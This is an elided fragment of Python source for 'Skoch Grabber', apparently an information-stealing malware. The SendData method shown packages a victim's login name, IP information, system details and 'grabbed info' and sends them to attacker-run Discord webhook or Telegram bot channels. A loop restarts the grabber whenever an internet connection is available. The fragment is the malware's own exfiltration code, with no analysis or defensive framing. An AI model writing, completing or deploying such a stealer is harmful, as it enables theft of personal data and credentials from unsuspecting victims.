...
class SkochGrabber:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        match Settings.C2[0]:
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://dsc.gg/skochworld",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by Skoch Grabber | https://dsc.gg/skochworld"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Skoch Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    SkochGrabber() # Start the grabber
